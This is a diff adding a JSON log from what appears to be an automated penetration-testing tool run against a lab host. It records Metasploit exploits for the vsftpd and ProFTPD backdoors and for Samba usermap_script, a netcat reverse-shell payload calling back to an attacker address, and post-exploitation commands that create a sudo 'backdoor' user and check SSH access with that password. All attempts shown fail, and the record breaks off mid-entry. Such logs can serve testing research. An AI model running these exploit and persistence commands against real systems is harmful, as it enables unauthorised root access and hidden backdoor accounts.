@@ -1,0 +1,760 @@
+{
+    "target": "192.168.56.5",
+    "attack_chains": {
+        "Chain 1: Vsftpd Backdoor Root Access": {
+            "initial_access": [
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'vsftpd_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "set RPORT 21",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [-] 192.168.56.5:21 - The service on\n port 6200 does not appear to be a shell\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Trigger vsftpd backdoor to obtain root shell session",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [-] 192.168.56.5:21 - The service on\n port 6200 does not appear to be a shell\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                }
+            ],
+            "post_exploitation": [
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sessions -i 1 -c 'useradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [-] 192.168.56.5:21 - The service on\n port 6200 does not appear to be a shell\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'useradd -m -G sudo\n backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'\n[-] Invalid session identifier: 1\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'vsftpd_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 2: ProFTPD Backdoor Root Access": {
+            "initial_access": [
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'proftpd_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "use exploit/unix/ftp/proftpd_133c_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "set RPORT 2121",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 2121\nRPORT => 2121\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 2121\nRPORT => 2121\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > exploit -j\n[-] 192.168.56.5:2121 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                },
+                {
+                    "description": "Trigger ProFTPD backdoor to obtain root shell session",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 2121\nRPORT => 2121\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > exploit -j\n[-] 192.168.56.5:2121 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                }
+            ],
+            "post_exploitation": [
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sessions -i 1 -c 'useradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/proftpd_133c_backdoor\nmsf > use exploit/unix/ftp/proftpd_133c_backdoor\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 2121\nRPORT => 2121\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > exploit -j\n[-] 192.168.56.5:2121 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/proftpd_133c_backdoor) > sessions -i 1 -c 'useradd -m -G su\ndo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'\n[-] Invalid session identifier: 1\nmsf exploit(unix/ftp/proftpd_133c_backdoor) >\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'proftpd_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 3: Samba Usermap Script RCE": {
+            "initial_access": [
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'samba_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "use exploit/multi/handler",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set LPORT 4445",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "run -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "use exploit/multi/samba/usermap_script",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.56.1\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4445\nuse exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "set LPORT 4445",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.56.1\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4445\nuse exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.56.1\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4445\nuse exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[-] Handler failed to bind to 0.0.0.0:4445:-  -\n[-] 192.168.56.5:139 - Exploit failed [bad-config]: Rex::BindFailed The address\nis already in use or unavailable: (0.0.0.0:4445).\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Samba for reverse shell",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.56.1\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4445\nuse exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[-] Handler failed to bind to 0.0.0.0:4445:-  -\n[-] 192.168.56.5:139 - Exploit failed [bad-config]: Rex::BindFailed The address\nis already in use or unavailable: (0.0.0.0:4445).\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                }
+            ],
+            "post_exploitation": [
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sessions -i 1 -c 'useradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 192.168.56.1\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4445\nuse exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 1.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[-] Handler failed to bind to 192.168.56.1:4445:-  -\n[-] Handler failed to bind to 0.0.0.0:4445:-  -\n[-] 192.168.56.5:139 - Exploit failed [bad-config]: Rex::BindFailed The address\nis already in use or unavailable: (0.0.0.0:4445).\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'useradd -m -G sudo b\nackdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'\n[-] Invalid session identifier: 1\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
